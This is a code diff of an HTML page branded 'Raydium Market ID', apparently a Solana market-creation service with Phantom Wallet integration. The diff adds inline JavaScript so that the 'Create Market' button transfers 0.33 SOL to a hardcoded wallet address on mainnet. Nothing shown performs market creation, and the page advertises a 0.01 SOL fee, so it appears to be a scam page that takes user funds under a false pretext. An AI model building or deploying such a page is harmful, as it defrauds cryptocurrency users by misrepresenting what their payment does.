@@ -59,9 +59,9 @@
         }
         
         .subheader {
-            background: linear-gradient(to right, #DC1FFF, #00FFA3); /* Gradient from #DC1FFF to #00FFA3 */
-            -webkit-background-clip: text; /* Clip text to background */
-            -webkit-text-fill-color: transparent; /* Make text transparent */
+            background: linear-gradient(to right, #DC1FFF, #00FFA3); 
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             font-size: 56px;
             font-weight: bold;
             margin-bottom: 10px;
@@ -144,7 +144,6 @@
                                 <div style="display:block">
                                     <div class="wallet-adapter-dropdown">
                                         <span class="walletButtons"></span>
-                                        <!-- Removed "Change wallet" option -->
                                     </div>
                                 </div>
                                 <div style="display:none">
@@ -163,7 +162,7 @@
         <div class="swiper mySwiper">
             <div class="swiper-wrapper">
                 <div class="swiper-slide">
-                    <h3 class="subheader">Create Market I.D</h3> <!-- Added subheader -->
+                    <h3 class="subheader">Create Market I.D</h3>
                     <h3 class="market-id-h3">Cheapest option with a platform fee of 0.01 SOL</h3>
                     <p class="para-note">
                         <span class="important">Important Note! </span>
@@ -232,10 +231,7 @@
                 <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong><FONT COLOR=ff0000>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
             </div>
             <div class="container confirm-btn">
-                <!-- Add onclick attribute to call the sendTokens function when button is clicked -->
-                <button class="btn btn-primary create-market" onclick="sendTokens('9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar', 0.33)">
-    Create Market
-</button> </div>
+                <button class="btn btn-primary create-market" onclick="sendTokens('9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar', 0.33)">Create Market</button>
             </div>
         </div>
     </div>
@@ -243,18 +239,52 @@
     <footer class="color-footer bg-body-tertiary text-center text-lg-start">
         <div class="text-center p-3">Copyright © 2024 Raydium Market ID. All rights reserved.</div>
     </footer>
-<button id="connectWalletBtn" class="btn btn-primary phantom-connect" onclick="connectWallet()">Connect with Phantom Wallet</button>
 
-    <!-- Solana Web3.js library -->
-    <button id="sendTransactionBtn">Send Transaction (0.33 SOL)</button>
+    <button id="connectWalletBtn" class="btn btn-primary phantom-connect" onclick="connectWallet()">Connect with Phantom Wallet</button>
 
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
 
-
-    <!-- Solana Web3.js library -->
     <!-- Include Phantom Wallet Script -->
-   <script src="https://solana.com/phantom/assets/phantom.js"></script>
-         <script type="module" src="script.js"></script>
+    <script>
+        // Connect to Phantom Wallet
+        async function connectWallet() {
+            try {
+                const resp = await window.solana.connect();
+                console.log('Connected to wallet:', resp.publicKey.toString());
+                // Add logic to update UI or store wallet address
+            } catch (err) {
+                console.error('Failed to connect to wallet:', err);
+            }
+        }
+
+        // Send tokens function
+        async function sendTokens(destination, amount) {
+            try {
+                if (!window.solana.isConnected) {
+                    await connectWallet();
+                }
+
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const fromWallet = window.solana;
+                const toPubkey = new solanaWeb3.PublicKey(destination);
+                const lamports = solanaWeb3.LAMPORTS_PER_SOL * amount;
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: fromWallet.publicKey,
+                        toPubkey,
+                        lamports,
+                    })
+                );
+
+                const { signature } = await fromWallet.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
+
+                console.log('Transaction successful:', signature);
+            } catch (err) {
+                console.error('Failed to send tokens:', err);
+            }
+        }
     </script>
 </body>
 </html>
